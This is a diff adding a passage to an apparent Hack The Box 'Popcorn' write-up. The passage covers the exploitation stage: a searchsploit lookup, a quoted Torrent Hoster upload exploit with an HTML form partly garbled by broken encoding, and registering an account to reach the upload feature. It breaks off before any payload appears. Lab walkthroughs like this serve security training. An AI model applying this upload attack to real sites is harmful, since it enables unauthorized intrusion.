@@ -75,3 +75,61 @@ gobuster dir -u http://popcorn.htb -w /usr/share/seclists/Discovery/Web-Content/
 ![](/Linux/Linux-Medium/Popcorn/Screenshots/torrentpopcorn.png)
 
 looking at the status code i try all with code `200` and `301` and find something intresting  on the [torrent](http://popcorn.htb/torrent/)
+
+
+![](/Linux/Linux-Medium/Popcorn/Screenshots/torrentwebpopcorn.png)
+
+# Exploitation
+Looking around the torrent site a bit, we find that there are module which seem intresting and we can register so that we can explore further.But lets first search for any exploit of `torrent hoster` with `searchsploit`.
+
+###### code
+
+```sh
+searchsploit torrent hoster 
+```
+
+###### Output
+
+![](/Linux/Linux-Medium/Popcorn/Screenshots/searchsploitpopcorn.png)
+
+We then examine the exploit to see what it does.
+
+![](/Linux/Linux-Medium/Popcorn/Screenshots/examinepopcorn.png)
+
+```sh
+========================================================================================
+| # Title    : Torrent Hoster Remont Upload Exploit
+| # Author   : El-Kahina
+| # Home     : www.h4kz.com                                                                              |
+| # Script   : Powered by Torrent Hoster.
+| # Tested on: windows SP2 Fran&#65533;ais V.(Pnx2 2.0) + Lunix Fran&#65533;ais v.(9.4 Ubuntu)
+| # Bug      : Upload
+|
+====================== Exploit By El-Kahina =================================
+ # Exploit  :
+
+ 1 - use tamper data :
+
+ http://127.0.0.1/torrenthoster//torrents.php?mode=upload
+
+ 2-
+    <center>
+   Powered by Torrent Hoster
+        <br />
+        <form enctype="multipart/form-data" action="http://127.0.0.1/torrenthoster/upload.php" id="form" method="post" onsubmit="a=document.getElementById('form').style;a.display='none';b=document.getElementById('part2').style;b.display='inline';" style="display: inline;">
+        <strong>&#65533;&#65533;&#65533;&#65533; &#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533; &#65533;&#65533; &#65533;&#65533;:</strong> <?php echo $maxfilesize; ?>&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;<br />
+<br>
+        <input type="file" name="upfile" size="50" /><br />
+<input type="submit" value="&#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533;" id="upload" />
+
+```
+
+The most promising option is the Upload section as from the exploit and best from the website it requires authorization.Luckily, there are no restrictions on account creation.
+
+![](/Linux/Linux-Medium/Popcorn/Screenshots/hosterpopcorn.png)
+
+After creating the account we log on to the upload and we find the instruction of uploading a torrent file we then we try uploading an image but it fails so we then download kali torrent to upload it so that we can see how it does it from `burpsuite`
+
+![](/Linux/Linux-Medium/Popcorn/Screenshots/kalitorrentpopcorn.png)
+
+After uploading the kali torrent we get a new page that it intresting where there is a `screenshot` 
